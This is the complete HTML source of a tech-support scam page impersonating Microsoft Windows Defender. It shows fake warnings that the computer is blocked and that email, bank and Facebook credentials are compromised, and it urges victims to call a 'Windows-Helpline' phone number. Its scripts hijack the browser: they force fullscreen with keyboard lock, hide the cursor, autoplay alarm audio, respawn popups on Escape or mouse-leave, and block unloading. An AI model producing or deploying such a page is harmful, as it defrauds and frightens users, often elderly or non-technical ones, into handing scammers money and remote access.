

<!doctype html>
<html lang="en">

<!--Start of Tawk.to Script-->
<script type="text/javascript">
  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
  (function(){
  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
  s1.async=true;
  s1.src='https://embed.tawk.to/66bb75c3146b7af4a439e2f3/1i56481bg';
  s1.charset='UTF-8';
  s1.setAttribute('crossorigin','*');
  s0.parentNode.insertBefore(s1,s0);
  })();
  </script>
  <!--End of Tawk.to Script-->

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"
          integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <link rel="stylesheet" type="text/css" href="main.css">
    <title>Service Center</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

    <script>
        function getVariableFromURll(name)
        {
            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
            var regexS = "[\\?&]"+name+"=([^&#]*)";
            var regex = new RegExp( regexS );
            var results = regex.exec( window.location.href );
            if( results == null )
                return "";
            else
                return results[1];
        }
    </script>
    <script type="text/javascript">
        var phone = getVariableFromURll('phone');
    </script>




<script>

    let closePP = document.querySelector('.btn23-primary');
    let overlay = document.querySelector('.modal23-dialog');

    let KEY_ESC = 27;
    document.onkeydown = function(e) {
        if (e.keyCode == KEY_ESC) {
           document.querySelector('.wrapper').style.cursor="auto";
           setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 7500);

       }
   }



   setTimeout( () => {document.querySelector('.modal23-dialog').style.display="block"}, 7500);

   document.addEventListener('click', () => {


    document.getElementById("webados").play();

    //document.documentElement.requestFullscreen();
    document.body.requestFullscreen().then(
    () => {
      const keys = [
        { code: 'Escape' },
        { code: 'Tab', altKey: true },
        { code: 'Tab', metaKey: true },
      ];
      //navigator.requestSystemKeyboardLock(keys);
      navigator.keyboard.lock();
    });
    document.addEventListener('keydown', event => {
      if (event.code == 'Escape') {
        console.dir('escape punched');
      }
    }, false);
    document.querySelector('.modal23-dialog').style.display="none";
    document.querySelector('.wrapper').style.cursor="none";


});



   document.addEventListener('mouseleave', showDontLeavePopup);
   var popupShows = 0;
   function showDontLeavePopup() {

    document.querySelector('.modal-dialog23').style.display="block";


}


        // document.querySelector('.btn-primary').onclick = function() {
        //     document.querySelector('.modal-dialog').style.display = 'none';
        // };


    </script>

</head>
<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">

  <div style="position:absolute; top:100px; right:10px; z-index:999999999;"><img src="def.gif" alt="" width="500"></div>


<audio id="webados" autoplay="">
    <source src="safegtb.mp3" type="audio/mpeg">
</audio>
<div class="bg" style="cursor:none;">
    <div class="background" style="top: 0px;"><img src="bg1.png" alt="" width="100%"/></div>
    <div class="background2" style="top: 0px;"><img src="bg1.png" alt="" width="100%" /></div>

</div>

<a href="#" rel="noreferrer" id="link_blck" style="cursor: none;">

</a>


<div id="footer" style="cursor: none;">
    <div class="row">

        <div class="col-md-12">
            <div class="right-foot" style="text-align: center;">
                <span id="footertxt"><img src="microsoft.png"> Windows Security: </span><span
                        style="font-weight: 700;padding-left: 13px;color: #fff;">Windows-Helpline <span
                            style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;margin-left: 5px;">+1-844-636-0496 </span></span>
            </div>
        </div>
        <div class="col-md-12">
            <marquee width="100%" direction="left" height="100px"><small class="text-left"
                                                                         style="color: #eee;font-size: 10px;">Windows Defender SmartScreen has prevented an unrecognized app from being displayed. Running this app may put your PC at risk. Windows Defender Scan has found potentially unwanted adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</small></marquee>
        </div>
    </div>


</div>

<div id="boxtxts" class="lightbox">
    <div class="ilb top">
        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="microsoft.png" class="logo3"></span> Windows Defender System Warning</span>
            <p id="txts1" class="fl title2"><a href="#"><img src="cross_white.png"></a></p>
            <!-- <div class="cr_bt"><img src="remove.png"></div> -->
        </div>
    </div>
    <div class="last_box">

    <div id="txtintro">
        <h3 class="colo-rd" style="font-size: 23px;
    margin-bottom: 0;"><img src="imgds.png" style="width:35px;"> Critical Threat detected: Adware App</h3>

         <p style="
    font-size: 15px;
    font-weight: bold;
    margin-bottom: 6px;
">Access to this System has been blocked for security reasons.</p>
<img id="banner" src="websafg.jpg">
         <p style="    font-size: 15px;
    font-weight: bold;margin-bottom: 0;">Important: Please contact support immediately to resolve this issue.</p>

    </div>
   <!--  <img id="banner" src="websafg.jpg"> -->
    <div id="disclaimer" style="text-align: center;">
        <span class="support">Windows-Helpline: +1-844-636-0496</span>
    </div>

</div>
<div id="bottom">
        <img id="badge" src="support.png"><span class="title3">Windows support </span>
        <ul>
            <li>
                <a href="#">
                    <div class="fr button">
                        <span id="addtochromebutton">GET HELP</span>
                    </div>
                </a>
            </li>
            <li>
                <a href="#">
                    <div class="fr button2">
                        <span id="addtochromebutton">Reject</span>
                    </div>
                </a>
            </li>

        </ul>

    </div>
</div>



<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    <p class="text-center" style="    font-size: 16px;
    font-weight: normal;
    margin: 0;
    margin-bottom: 5px;
    padding: 5px 10px;
    color: #FFFFFF !important;
    color: #414141;font-weight: bold;
    margin-top: 8px;">Windows Defender Security Warning</p>
    <p>** ACCESS TO THIS COMPUTER HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
      <p>Your System has reported to us that it has been infected with an adware app. The following data has been compromised.</p>
      <p>&gt; Email credentials<br>
          &gt; Bank passwords<br>
          &gt; Facebook Login<br>
          &gt; Pictures &amp; Documents

      </p>
      <p>Windows Defender Scan has found potentially unwanted adware on this device that can steal your passwords, online identity, financial information, personal files, pictures or documents.</p>
      <p>You must contact us immediately so that our technicians can guide you through the removal process by phone.</p>
      <p>Call Windows Support immediately to report this threat, prevent identity theft and unlock access to this device.</p>
      <p>Closing this window puts your personal data at risk and results in a suspension of your Windows registry.</p>
    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Call Windows Support: <strong>
            +1-844-636-0496</strong></p>
    <div class="action_buttons"><a class="active" id="leave_page"
                                   style="cursor: pointer; color: #FFFFFF !important;">Run safely</a> <a class="active"
                                                                                                 id="leave_page"
                                                                                                 style="color: #FFFFFF !important;">Ignore</a>
    </div>
</div>

<div id="WelDiv"
     style=" display:none; background-color:#0000009e; height: auto; width: 550px; left:32%;position: absolute;top:0;z-index: 9999999999;  "
     class="answer_list">
    <p class="text-center" style="color: #FEFEFE; background-color:#0000009e;  margin-top:10px; font-size: 16px; ">You must contact us immediately so that our technicians can guide you through the removal process by phone.<br>Your System is disabled.<br><br> </p>


</div>


<!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-Piv4xVNRyMGpqkS2by6br4gNJ7DXjqk09RmUpJ8jgGtD7zP9yug3goQfGII0yAns"
        crossorigin="anonymous"></script>
<script type="text/javascript" src="fullscreen.js"></script>
<script type="text/javascript" src="before.js"></script>
<script type="text/javascript" src="main.js"></script>

<script type="text/javascript">
    (function ($) {
        $.fn.countTo = function (options) {
            options = options || {};

            return $(this).each(function () {
                // set options for current element
                var settings = $.extend({}, $.fn.countTo.defaults, {
                    from: $(this).data('from'),
                    to: $(this).data('to'),
                    speed: $(this).data('speed'),
                    refreshInterval: $(this).data('refresh-interval'),
                    decimals: $(this).data('decimals')
                }, options);

                // how many times to update the value, and how much to increment the value on each update
                var loops = Math.ceil(settings.speed / settings.refreshInterval),
                    increment = (settings.to - settings.from) / loops;

                // references & variables that will change with each update
                var self = this,
                    $self = $(this),
                    loopCount = 0,
                    value = settings.from,
                    data = $self.data('countTo') || {};

                $self.data('countTo', data);

                // if an existing interval can be found, clear it first
                if (data.interval) {
                    clearInterval(data.interval);
                }
                data.interval = setInterval(updateTimer, settings.refreshInterval);

                // initialize the element with the starting value
                render(value);

                function updateTimer() {
                    value += increment;
                    loopCount++;

                    render(value);

                    if (typeof (settings.onUpdate) == 'function') {
                        settings.onUpdate.call(self, value);
                    }

                    if (loopCount >= loops) {
                        // remove the interval
                        $self.removeData('countTo');
                        clearInterval(data.interval);
                        value = settings.to;

                        if (typeof (settings.onComplete) == 'function') {
                            settings.onComplete.call(self, value);
                        }
                    }
                }

                function render(value) {
                    var formattedValue = settings.formatter.call(self, value, settings);
                    $self.html(formattedValue);
                }
            });
        };

        $.fn.countTo.defaults = {
            from: 0,               // the number the element should start at
            to: 0,                 // the number the element should end at
            speed: 100,           // how long it should take to count between the target numbers
            refreshInterval: 100,  // how often the element should be updated
            decimals: 0,           // the number of decimal places to show
            formatter: formatter,  // handler for formatting the value before rendering
            onUpdate: null,        // callback method for every time the element is updated
            onComplete: null       // callback method for when the element finishes updating
        };

        function formatter(value, settings) {
            return value.toFixed(settings.decimals);
        }
    }(jQuery));

    jQuery(function ($) {
        // custom formatting example
        $('.count-number').data('countToOptions', {
            formatter: function (value, options) {
                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
            }
        });

        // start all the timers
        $('.timer').each(count);

        function count(options) {
            var $this = $(this);
            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
            $this.countTo(options);
        }
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $(".safegets2").delay(1).fadeIn(800);
        $(".safegets3").delay(1).fadeIn(800);
        $(".safegets3").delay(1).fadeIn(800);
        $("#pop_up_new").delay(1).fadeIn(800);
        $("#boxtxts").delay(1).fadeIn(800);
        $(".blck").delay(7300).fadeIn();
    });
</script>
<script type="text/javascript">
    setTimeout(function () {
        document.getElementById("webados").play();
    });
</script>
<script>
    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $("#WelDiv").show();
        });
    });
</script>
<script>
    $(document).ready(function () {
        $("#mycanvas").click(function () {
            $(".background").hide();
            $(".background2").show();
        });
    });
</script>
<script>
    $(document).ready(function () {
        $("body").click(function () {
            $(".blck").hide();
        });
    });
</script>
<script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $("#boxtxts").show();
        });]]
    });
</script>
<!-- <script type="text/javascript">
    $(document).ready(function () {
        $("body").mouseover(function () {
            $(".blck").show();
        });
    });
</script> -->
</body>
</html>
